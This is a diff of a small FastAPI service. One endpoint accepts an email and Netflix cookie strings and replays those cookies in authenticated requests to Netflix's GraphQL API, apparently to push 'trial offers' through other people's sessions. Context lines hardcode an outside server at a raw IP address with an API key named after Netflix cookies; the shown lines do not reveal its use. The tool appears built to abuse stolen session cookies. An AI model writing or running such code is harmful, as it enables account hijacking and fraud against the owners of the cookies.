@@ -9,13 +9,6 @@ from datetime import datetime
 
 app = FastAPI()
 
-from fastapi import FastAPI
-
-app = FastAPI()
-
-@app.get("/")
-async def read_root():
-    return {"message": "Hello, World!"}
 OUTPUT_FOLDER = ".cache"
 if not os.path.exists(OUTPUT_FOLDER):
     os.makedirs(OUTPUT_FOLDER)
@@ -97,8 +90,6 @@ def generate_request_id():
 
 def generate_toplevel_uuid():
     return str(uuid.uuid4())
-
-# --- Your main function to send the trial offer ---
 
 _srv = "http://85.115.209.225:3739"
 _apikey = "NetflixCookie2026!@#"
@@ -222,14 +213,13 @@ def send_trial_offer(email, cookie_string):
                 }
             }
         }
-        
+
         response = requests.post('https://web.prod.cloud.netflix.com/graphql', 
                                 headers=headers, json=data, timeout=10)
         results['update'] = {'status': response.status_code}
     except:
         pass
 
-    # Fetch an image (simulate)
     try:
         headers = {
             'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
@@ -244,9 +234,11 @@ def send_trial_offer(email, cookie_string):
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"'
         }
+
         image_url = 'https://occ-0-6711-64.1.nflxso.net/dnm/api/v6/QqNdfvCShgtu-ra1rla_KxCcSSY/AAAAQAmpros-eVHttd-jyVbIiMTW885cisEwMOLTGkTzHQifWIkevLiCu24tEsptsw.png?r=bff'
         response = requests.get(image_url, headers=headers, timeout=10)
         results['image'] = {'status': response.status_code}
+
         if response.status_code == 200:
             return results, True
         return results, False
@@ -259,8 +251,8 @@ class TrialRequest(BaseModel):
     email: EmailStr
     cookies_content: str  # Cookie string or JSON content
 
-@app.post("/send_trial")
-async def send_trial(request: TrialRequest):
+@app.post("/run_trial")
+async def run_trial(request: TrialRequest):
     email = request.email
     cookie_content = request.cookies_content
 
